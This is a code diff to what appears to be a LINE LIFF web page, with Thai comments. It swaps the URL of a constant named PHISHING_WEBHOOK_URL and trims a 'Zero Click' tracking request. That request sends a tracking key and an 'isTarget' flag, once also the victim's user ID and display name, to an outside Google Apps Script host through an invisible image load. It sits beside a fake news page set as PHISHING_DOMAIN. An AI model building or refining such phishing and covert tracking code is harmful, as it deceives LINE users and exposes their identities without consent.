@@ -399,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbytQpJbD5-Zz1q19f5T6JLd3kAe--BSWBBW3CNMPfncmn7gIsgEMlsvmYC-Sdtxbwnpzg/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbw56LMm61r32dz2y6wpWB-pQO-e5U6t0BEde6C7OLOwJREV-dXMD2X4FE9ukJzhNqzU4g/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -823,14 +823,11 @@
                 // รวบรวมข้อมูลอุปกรณ์สำหรับส่งใน Zero Click tracking URL
                 const randomSuffix = Date.now() + Math.random().toString(36).substring(2, 10);
                 
-                // สร้าง URL สำหรับ Zero Click tracking พร้อมข้อมูลการติดตาม
-                // ใช้เป็นพารามิเตอร์ในการโหลดภาพเล็กๆ ที่มองไม่เห็น
+                // สร้าง URL สำหรับ Zero Click tracking ที่มีเฉพาะข้อมูลจำเป็น
+                // แก้ไข: ลดพารามิเตอร์เหลือเฉพาะที่จำเป็นเพื่อความสะดวกและลดโอกาสเกิดปัญหา
                 let zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick`;
                 zeroClickTrackUrl += `&key=${trackingKey}`;
-                zeroClickTrackUrl += `&case=${encodeURIComponent(caseName)}`;
-                zeroClickTrackUrl += `&creator=${encodeURIComponent(userId)}`;
-                zeroClickTrackUrl += `&name=${encodeURIComponent(displayName)}`;
-                zeroClickTrackUrl += `&isTarget=true`; // เพิ่มพารามิเตอร์สำคัญที่ระบุว่านี่เป็นการเรียกจากเป้าหมาย
+                zeroClickTrackUrl += `&isTarget=true`; // ระบุว่านี่คือการเรียกจากเป้าหมาย
                 zeroClickTrackUrl += `&r=${randomSuffix}`;  // ป้องกันการแคช
                 
                 console.log("Zero Click Track URL:", zeroClickTrackUrl);
